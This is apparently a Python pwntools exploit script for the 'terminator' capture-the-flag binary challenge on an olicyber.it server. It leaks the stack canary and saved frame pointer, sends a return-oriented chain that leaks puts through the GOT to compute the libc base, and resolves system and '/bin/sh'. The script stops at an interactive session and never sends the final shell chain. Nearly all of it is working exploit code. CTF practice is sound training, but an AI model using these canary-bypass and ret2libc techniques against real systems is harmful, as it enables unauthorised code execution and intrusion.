from pwn import *

libc = ELF("./binaries/libc.so.6", checksec=False)
libc.address = 0
elf = ELF("./binaries/terminator_patched", checksec=False)
r = remote("terminator.challs.olicyber.it", 10307)
# r = process("./binaries/terminator")

def leak_canary_rbp(r, n):
    payload = b"a" * n
    r.sendlineafter(b"> ", payload)
    r.recvline()

    leaked_bytes = r.recvuntil(b"Nice").replace(b"Nice", b"").strip()

    canary_raw = b"\x00" + leaked_bytes[:7]
    rbp_raw    = leaked_bytes[7:15].ljust(8, b"\x00")
    canary = u64(canary_raw)
    rbp    = u64(rbp_raw)

    return canary, rbp

canary, rbp = leak_canary_rbp(r, 55)
print(hex(canary))
print(hex(rbp))

pop_rdi   = 0x4012fb
ret       = 0x401016
leave_ret = 0x4011cc

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]

payload  = p64(ret)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(elf.symbols["main"])
payload  = payload.ljust(56, b"a")
payload += p64(canary)
payload += p64(rbp - 0x68)


r.sendlineafter(b"> ", payload)
r.recvline()
puts_raw = r.recvline().strip().ljust(8, b"\x00")
puts_addr = u64(puts_raw)

libc_base = puts_addr - libc.symbols["puts"]

bin_sh = libc_base + next(libc.search(b"/bin/sh"))
system = libc_base + libc.symbols["system"]

r.interactive()